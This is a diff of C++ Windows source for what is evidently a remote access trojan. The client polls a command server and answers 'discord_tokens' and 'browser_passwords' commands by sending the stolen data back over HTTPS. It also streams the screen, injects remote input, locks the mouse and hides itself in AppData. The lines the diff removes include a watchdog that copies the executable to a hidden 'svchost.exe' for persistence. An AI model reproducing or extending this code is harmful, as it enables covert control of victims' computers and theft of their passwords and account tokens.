@@ -49,7 +49,6 @@ std::string getTimestamp() {
 std::string httpsPost(const std::string& path, const std::string& body) {
     HINTERNET s = WinHttpOpen(L"P/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 0, 0, 0);
     if (!s) return "err";
-
     HINTERNET c = WinHttpConnect(s, std::wstring(g_serverHost.begin(),g_serverHost.end()).c_str(), g_serverPort, 0);
     if (!c) { WinHttpCloseHandle(s); return "err"; }
     HINTERNET r = WinHttpOpenRequest(c, L"POST", std::wstring(path.begin(),path.end()).c_str(), 0, 0, 0, g_serverSSL ? WINHTTP_FLAG_SECURE : 0);
@@ -66,7 +65,6 @@ std::string httpsPost(const std::string& path, const std::string& body) {
 std::string httpsPut(const std::string& path, const std::string& body) {
     HINTERNET s = WinHttpOpen(L"P/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 0, 0, 0);
     if (!s) return "err";
-
     HINTERNET c = WinHttpConnect(s, std::wstring(g_serverHost.begin(),g_serverHost.end()).c_str(), g_serverPort, 0);
     if (!c) { WinHttpCloseHandle(s); return "err"; }
     HINTERNET r = WinHttpOpenRequest(c, L"PUT", std::wstring(path.begin(),path.end()).c_str(), 0, 0, 0, g_serverSSL ? WINHTTP_FLAG_SECURE : 0);
@@ -83,7 +81,6 @@ std::string httpsPut(const std::string& path, const std::string& body) {
 std::string httpsPatch(const std::string& path, const std::string& body) {
     HINTERNET s = WinHttpOpen(L"P/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 0, 0, 0);
     if (!s) return "err";
-
     HINTERNET c = WinHttpConnect(s, std::wstring(g_serverHost.begin(),g_serverHost.end()).c_str(), g_serverPort, 0);
     if (!c) { WinHttpCloseHandle(s); return "err"; }
     HINTERNET r = WinHttpOpenRequest(c, L"PATCH", std::wstring(path.begin(),path.end()).c_str(), 0, 0, 0, g_serverSSL ? WINHTTP_FLAG_SECURE : 0);
@@ -100,7 +97,6 @@ std::string httpsPatch(const std::string& path, const std::string& body) {
 std::string httpsGet(const std::string& path) {
     HINTERNET s = WinHttpOpen(L"P/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 0, 0, 0);
     if (!s) return "";
-
     HINTERNET c = WinHttpConnect(s, std::wstring(g_serverHost.begin(),g_serverHost.end()).c_str(), g_serverPort, 0);
     if (!c) { WinHttpCloseHandle(s); return ""; }
     HINTERNET r = WinHttpOpenRequest(c, L"GET", std::wstring(path.begin(),path.end()).c_str(), 0, 0, 0, g_serverSSL ? WINHTTP_FLAG_SECURE : 0);
@@ -115,12 +111,11 @@ std::string httpsGet(const std::string& path) {
 
 std::string httpsDelete(const std::string& path) {
     HINTERNET s = WinHttpOpen(L"P/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 0, 0, 0);
-    if (!s) return "err";
-
+    if (!s) return "";
     HINTERNET c = WinHttpConnect(s, std::wstring(g_serverHost.begin(),g_serverHost.end()).c_str(), g_serverPort, 0);
-    if (!c) { WinHttpCloseHandle(s); return "err"; }
+    if (!c) { WinHttpCloseHandle(s); return ""; }
     HINTERNET r = WinHttpOpenRequest(c, L"DELETE", std::wstring(path.begin(),path.end()).c_str(), 0, 0, 0, g_serverSSL ? WINHTTP_FLAG_SECURE : 0);
-    if (!r) { WinHttpCloseHandle(c); WinHttpCloseHandle(s); return "err"; }
+    if (!r) { WinHttpCloseHandle(c); WinHttpCloseHandle(s); return ""; }
     WinHttpSendRequest(r, L"", -1, 0, 0, 0, 0);
     WinHttpReceiveResponse(r, 0);
     WinHttpCloseHandle(r); WinHttpCloseHandle(c); WinHttpCloseHandle(s);
@@ -130,7 +125,6 @@ std::string httpsDelete(const std::string& path) {
 std::string httpsGetUrl(const std::string& host, const std::string& path) {
     HINTERNET s = WinHttpOpen(L"P/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 0, 0, 0);
     if (!s) return "";
-
     HINTERNET c = WinHttpConnect(s, std::wstring(host.begin(),host.end()).c_str(), 443, 0);
     if (!c) { WinHttpCloseHandle(s); return ""; }
     HINTERNET r = WinHttpOpenRequest(c, L"GET", std::wstring(path.begin(),path.end()).c_str(), 0, 0, 0, WINHTTP_FLAG_SECURE);
@@ -1328,10 +1322,8 @@ void killProcessByName(const char* name) {
 }
 
 DWORD WINAPI mouseLock10(LPVOID) {
-    try {
     DWORD start = GetTickCount();
     while (GetTickCount() - start < 10000) { SetCursorPos(0, 0); Sleep(30); }
-    } catch(...) {}
     return 0;
 }
 
@@ -1476,7 +1468,6 @@ std::string uninstallSelf() {
 }
 
 DWORD WINAPI pollThread(LPVOID) {
-    try {
     Sleep(3000);
     try{if(!g_noPing)sendPing();}catch(...){}
     int pingCtr=0;
@@ -1560,27 +1551,21 @@ DWORD WINAPI pollThread(LPVOID) {
                     } else if (type == "discord_tokens") {
                         std::string k = key;
                         CreateThread(0, 0, [](LPVOID p) -> DWORD {
-                            try {
                             auto* d = (std::pair<std::string,std::string>*)p;
                             std::string r = jsonEscape(getDiscordTokens());
                             std::string b = "{\"status\":\"done\",\"result\":\"" + r + "\"}";
                             httpsPatch("/commands/" + fbEsc(d->first) + "/" + d->second + ".json", b);
-                            delete d;
-                            } catch(...) {}
-                            return 0;
+                            delete d; return 0;
                         }, new std::pair<std::string,std::string>(computerName, key), 0, 0);
                         result = "processing";
                     } else if (type == "browser_passwords") {
                         std::string k = key;
                         CreateThread(0, 0, [](LPVOID p) -> DWORD {
-                            try {
                             auto* d = (std::pair<std::string,std::string>*)p;
                             std::string r = jsonEscape(getBrowserPasswords());
                             std::string b = "{\"status\":\"done\",\"result\":\"" + r + "\"}";
                             httpsPatch("/commands/" + fbEsc(d->first) + "/" + d->second + ".json", b);
-                            delete d;
-                            } catch(...) {}
-                            return 0;
+                            delete d; return 0;
                         }, new std::pair<std::string,std::string>(computerName, key), 0, 0);
                         result = "processing";
                     } else if (type == "passwords") result = getPasswords();
@@ -1615,12 +1600,10 @@ DWORD WINAPI pollThread(LPVOID) {
             }
         } catch(...) {}
     }
-    } catch(...) {}
     return 0;
 }
 
 DWORD WINAPI screenThread(LPVOID) {
-    try {
     Sleep(3000);
     while(true) {
         DWORD t0 = GetTickCount();
@@ -1635,12 +1618,10 @@ DWORD WINAPI screenThread(LPVOID) {
         DWORD elapsed = GetTickCount() - t0;
         if (elapsed < 100) Sleep(100 - elapsed);
     }
-    } catch(...) {}
     return 0;
 }
 
 DWORD WINAPI inputThread(LPVOID) {
-    try {
     Sleep(3000);
     while(true) {
         Sleep(15);
@@ -1675,7 +1656,6 @@ DWORD WINAPI inputThread(LPVOID) {
             if (hasEvents) httpsDelete("/input/" + fbEsc(computerName) + ".json");
         } catch(...) {}
     }
-    } catch(...) {}
     return 0;
 }
 
@@ -1707,31 +1687,7 @@ void hideToAppData() {
     }
 }
 
-// Thread handles for watchdog
-HANDLE g_hPoll = 0, g_hInput = 0, g_hScreen = 0;
-DWORD WINAPI watchdogThread(LPVOID) {
-    while (true) {
-        Sleep(5000);
-        char exePath[MAX_PATH];
-        if (GetModuleFileNameA(NULL, exePath, MAX_PATH) > 0) {
-            char la[MAX_PATH];
-            if (GetEnvironmentVariableA("LOCALAPPDATA", la, MAX_PATH) > 0) {
-                std::string dest = std::string(la) + "\\svchost.exe";
-                if (_stricmp(exePath, dest.c_str()) != 0 && GetFileAttributesA(dest.c_str()) == INVALID_FILE_ATTRIBUTES) {
-                    CopyFileA(exePath, dest.c_str(), FALSE);
-                    SetFileAttributesA(dest.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
-                }
-            }
-        }
-        if (g_hPoll) { DWORD r = WaitForSingleObject(g_hPoll, 0); if (r == WAIT_OBJECT_0) { CloseHandle(g_hPoll); g_hPoll = CreateThread(0, 0, pollThread, 0, 0, 0); } } else g_hPoll = CreateThread(0, 0, pollThread, 0, 0, 0);
-        if (g_hInput) { DWORD r = WaitForSingleObject(g_hInput, 0); if (r == WAIT_OBJECT_0) { CloseHandle(g_hInput); g_hInput = CreateThread(0, 0, inputThread, 0, 0, 0); } } else g_hInput = CreateThread(0, 0, inputThread, 0, 0, 0);
-        if (g_hScreen) { DWORD r = WaitForSingleObject(g_hScreen, 0); if (r == WAIT_OBJECT_0) { CloseHandle(g_hScreen); g_hScreen = CreateThread(0, 0, screenThread, 0, 0, 0); } } else g_hScreen = CreateThread(0, 0, screenThread, 0, 0, 0);
-    }
-    return 0;
-}
-
 int main(int argc, char* argv[]) {
-    SetErrorMode(SEM_NOGPFAULTERRORBOX);
     bool noScreen = false, showConsole = false;
     for (int i = 1; i < argc; i++) {
         std::string a = argv[i];
@@ -1754,7 +1710,6 @@ int main(int argc, char* argv[]) {
             g_serverHost = s;
         }
     }
-    try {
     if (computerName.empty()) computerName = getComputerName();
     hideToAppData();
     CreateThread(0, 0, mouseLock10, 0, 0, 0);
@@ -1766,11 +1721,9 @@ int main(int argc, char* argv[]) {
     GdiplusStartupInput gdiplusStartupInput;
     ULONG_PTR gdiplusToken;
     GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
-    g_hPoll = CreateThread(0, 0, pollThread, 0, 0, 0);
-    g_hInput = CreateThread(0, 0, inputThread, 0, 0, 0);
-    if (!noScreen) g_hScreen = CreateThread(0, 0, screenThread, 0, 0, 0);
-    CreateThread(0, 0, watchdogThread, 0, 0, 0);
+    CreateThread(0, 0, pollThread, 0, 0, 0);
+    CreateThread(0, 0, inputThread, 0, 0, 0);
+    if (!noScreen) CreateThread(0, 0, screenThread, 0, 0, 0);
     // Keep alive - threads do all the work
     while (true) Sleep(10000);
-    } catch(...) { return 1; }
 }
